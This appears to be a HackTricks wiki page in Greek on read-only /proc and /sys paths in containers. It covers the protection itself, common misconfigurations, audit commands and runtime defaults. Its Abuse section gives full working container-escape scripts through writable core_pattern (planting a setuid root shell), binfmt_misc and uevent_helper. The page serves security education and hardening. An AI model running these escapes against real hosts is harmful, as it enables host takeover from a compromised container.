# Read-Only System Paths

{{#include ../../../../banners/hacktricks-training.md}}

Τα read-only system paths είναι μια ξεχωριστή προστασία από τα masked paths. Αντί να αποκρύπτει πλήρως ένα path, το runtime το εκθέτει, αλλά το προσαρτά ως read-only. Αυτό είναι συνηθισμένο για επιλεγμένες τοποθεσίες procfs και sysfs, όπου η read access μπορεί να είναι αποδεκτή ή λειτουργικά απαραίτητη, αλλά οι εγγραφές θα ήταν υπερβολικά επικίνδυνες.

Ο σκοπός είναι απλός: πολλές kernel interfaces γίνονται πολύ πιο επικίνδυνες όταν είναι writable. Ένα read-only mount δεν εξαλείφει όλη την αξία του reconnaissance, αλλά εμποδίζει ένα compromised workload να τροποποιήσει τα υποκείμενα kernel-facing files μέσω αυτού του path.

## Operation

Τα runtimes συχνά επισημαίνουν τμήματα του proc/sys view ως read-only. Ανάλογα με το runtime και το host, αυτό μπορεί να περιλαμβάνει paths όπως:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Η πραγματική λίστα διαφέρει, αλλά το μοντέλο παραμένει το ίδιο: επιτρέπεται η ορατότητα όπου χρειάζεται και απαγορεύεται η μετάλλαξη by default.

## Lab

Επιθεωρήστε τη λίστα read-only paths που δηλώνεται από το Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Επιθεωρήστε την προσαρτημένη προβολή proc/sys από το εσωτερικό του container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Επιπτώσεις στην ασφάλεια

Τα read-only system paths περιορίζουν μια μεγάλη κατηγορία καταχρήσεων που επηρεάζουν το host. Ακόμη και όταν ένας attacker μπορεί να επιθεωρήσει τα procfs ή sysfs, η αδυναμία εγγραφής εκεί καταργεί πολλές άμεσες οδούς τροποποίησης που αφορούν kernel tunables, crash handlers, module-loading helpers ή άλλα control interfaces. Η έκθεση δεν εξαφανίζεται, αλλά η μετάβαση από information disclosure σε επιρροή στο host γίνεται δυσκολότερη.

## Misconfigurations

Τα βασικά λάθη είναι η κατάργηση του masking ή η επαναπροσάρτηση ευαίσθητων paths ως read-write, η άμεση έκθεση περιεχομένου host proc/sys μέσω writable bind mounts ή η χρήση privileged modes που ουσιαστικά παρακάμπτουν τα ασφαλέστερα προεπιλεγμένα runtime settings. Στο Kubernetes, τα `procMount: Unmasked` και τα privileged workloads συχνά συνυπάρχουν με ασθενέστερη proc protection. Ένα ακόμη συνηθισμένο operational λάθος είναι η υπόθεση ότι, επειδή το runtime συνήθως κάνει mount αυτά τα paths ως read-only, όλα τα workloads εξακολουθούν να κληρονομούν αυτή την προεπιλογή.

## Abuse

Αν η protection είναι αδύναμη, ξεκινήστε αναζητώντας writable proc/sys entries:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Όταν υπάρχουν εγγραφές με δυνατότητα εγγραφής, οι σημαντικές επόμενες διαδρομές περιλαμβάνουν:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Τι μπορούν να αποκαλύψουν αυτές οι εντολές:

- Οι εγγράψιμες καταχωρίσεις κάτω από το `/proc/sys` συχνά σημαίνουν ότι το container μπορεί να τροποποιήσει τη συμπεριφορά του kernel του host και όχι απλώς να την επιθεωρήσει.
- Το `core_pattern` είναι ιδιαίτερα σημαντικό, επειδή μια εγγράψιμη τιμή που αφορά τον host μπορεί να μετατραπεί σε διαδρομή εκτέλεσης κώδικα στον host, προκαλώντας κατάρρευση μιας διεργασίας αφού πρώτα οριστεί ένας pipe handler.
- Το `modprobe` αποκαλύπτει το helper που χρησιμοποιεί ο kernel για ροές που σχετίζονται με τη φόρτωση modules· αποτελεί κλασικό στόχο υψηλής αξίας όταν είναι εγγράψιμο.
- Το `binfmt_misc` δείχνει αν είναι δυνατή η εγγραφή custom interpreters. Αν η εγγραφή είναι εγγράψιμη, αυτό μπορεί να μετατραπεί σε execution primitive και όχι απλώς σε information leak.
- Το `panic_on_oom` ελέγχει μια απόφαση του kernel που ισχύει για ολόκληρο τον host και επομένως μπορεί να μετατρέψει την εξάντληση πόρων σε άρνηση υπηρεσίας στον host.
- Το `uevent_helper` είναι ένα από τα σαφέστερα παραδείγματα όπου μια εγγράψιμη διαδρομή helper στο sysfs οδηγεί σε εκτέλεση στο context του host.

Ενδιαφέροντα ευρήματα περιλαμβάνουν εγγράψιμα proc knobs ή εγγραφές sysfs που αφορούν τον host και κανονικά θα έπρεπε να είναι μόνο για ανάγνωση. Σε αυτό το σημείο, το workload έχει μετακινηθεί από μια περιορισμένη οπτική του container προς ουσιαστική επιρροή στον kernel.

### Πλήρες παράδειγμα: `core_pattern` Host Escape

Αν το `/proc/sys/kernel/core_pattern` είναι εγγράψιμο μέσα από το container και δείχνει στην οπτική του kernel του host, μπορεί να γίνει abuse για την εκτέλεση ενός payload μετά από μια κατάρρευση:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Αν η διαδρομή καταλήγει πράγματι στον kernel του host, το payload εκτελείται στον host και αφήνει πίσω ένα setuid shell.

### Πλήρες παράδειγμα: Καταχώριση `binfmt_misc`

Αν το `/proc/sys/fs/binfmt_misc/register` είναι εγγράψιμο, μια καταχώριση custom interpreter μπορεί να προκαλέσει code execution όταν εκτελείται το αντίστοιχο αρχείο:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Σε ένα host-facing εγγράψιμο `binfmt_misc`, το αποτέλεσμα είναι code execution στη διαδρομή interpreter που ενεργοποιείται από τον kernel.

### Πλήρες Example: `uevent_helper`

Αν το `/sys/kernel/uevent_helper` είναι εγγράψιμο, ο kernel μπορεί να καλέσει ένα host-path helper όταν ενεργοποιηθεί ένα matching event:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Ο λόγος για τον οποίο αυτό είναι τόσο επικίνδυνο είναι ότι η διαδρομή του helper επιλύεται από την οπτική του filesystem του host και όχι από ένα ασφαλές, αποκλειστικά για το container, context.

## Έλεγχοι

Αυτοί οι έλεγχοι καθορίζουν αν η έκθεση των procfs/sysfs είναι read-only όπου αναμένεται και αν το workload μπορεί ακόμη να τροποποιήσει ευαίσθητα kernel interfaces.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Τι είναι ενδιαφέρον εδώ:

- Ένα κανονικό hardened workload θα πρέπει να εκθέτει ελάχιστες writable καταχωρίσεις proc/sys.
- Οι writable διαδρομές `/proc/sys` είναι συχνά πιο σημαντικές από τη συνηθισμένη read πρόσβαση.
- Αν το runtime αναφέρει ότι μια διαδρομή είναι read-only, αλλά στην πράξη είναι writable, ελέγξτε προσεκτικά τα mount propagation, bind mounts και privilege settings.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένη χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Το Docker ορίζει μια προεπιλεγμένη read-only λίστα διαδρομών για ευαίσθητες καταχωρίσεις proc | έκθεση host proc/sys mounts, `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | Το Podman εφαρμόζει προεπιλεγμένες read-only διαδρομές, εκτός αν χαλαρώσουν ρητά | `--security-opt unmask=ALL`, ευρεία host mounts, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime | Χρησιμοποιεί το υποκείμενο μοντέλο read-only διαδρομών του runtime, εκτός αν αποδυναμωθεί μέσω ρυθμίσεων Pod ή host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Προεπιλογή runtime | Συνήθως βασίζεται στις προεπιλογές OCI/runtime | όπως στη γραμμή του Kubernetes· οι άμεσες αλλαγές στη ρύθμιση του runtime μπορούν να αποδυναμώσουν τη συμπεριφορά |

Το βασικό σημείο είναι ότι οι read-only διαδρομές συστήματος υπάρχουν συνήθως ως προεπιλογή του runtime, αλλά μπορούν εύκολα να υπονομευτούν μέσω privileged modes ή host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
